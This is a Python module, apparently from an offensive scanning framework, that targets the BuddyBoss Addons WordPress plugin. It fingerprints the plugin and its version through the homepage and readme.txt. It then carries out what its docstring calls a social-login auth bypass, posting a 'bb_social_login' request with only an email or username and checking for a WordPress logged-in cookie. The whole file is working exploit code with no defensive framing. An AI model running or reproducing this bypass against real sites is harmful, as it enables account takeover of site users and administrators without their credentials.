#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""BuddyBoss Addons WordPress plugin helpers."""

from __future__ import annotations

import re
from typing import Dict, Optional, Tuple

from core.framework.base_module import BaseModule


class Buddyboss_addons(BaseModule):
    """Fingerprint and social-login auth bypass."""

    @staticmethod
    def buddyboss_match(text: str) -> bool:
        return "buddyboss" in (text or "").lower()

    def buddyboss_detected(self) -> Tuple[bool, str]:
        for path in ("/", "/wp-content/plugins/buddyboss-addons/readme.txt"):
            resp = self.http_request("GET", path, timeout=12)
            if resp and self.buddyboss_match(resp.text or ""):
                version = ""
                if "readme" in path:
                    match = re.search(r"Stable tag:\s*([\w.\-]+)", resp.text or "", re.I)
                    if match:
                        version = match.group(1)
                return True, version
        return False, ""

    @staticmethod
    def wp_logged_in(session) -> bool:
        if not session:
            return False
        for cookie in getattr(session, "cookies", []):
            if str(cookie.name).startswith("wordpress_logged_in"):
                return True
        return False

    def buddyboss_social_login(
        self,
        email: str = "",
        login: str = "",
    ) -> Optional[Dict[str, object]]:
        data = {"action": "bb_social_login"}
        if email:
            data["email"] = email
        if login:
            data["user_login"] = login
        for ep in ("/wp-admin/admin-ajax.php", "/wp-json/buddyboss/v1/login"):
            resp = self.http_request("POST", ep, data=data, timeout=20, session=True)
            if self.wp_logged_in(self.session):
                code = int(resp.status_code or 0) if resp else 0
                return {"endpoint": ep, "status_code": code}
        return None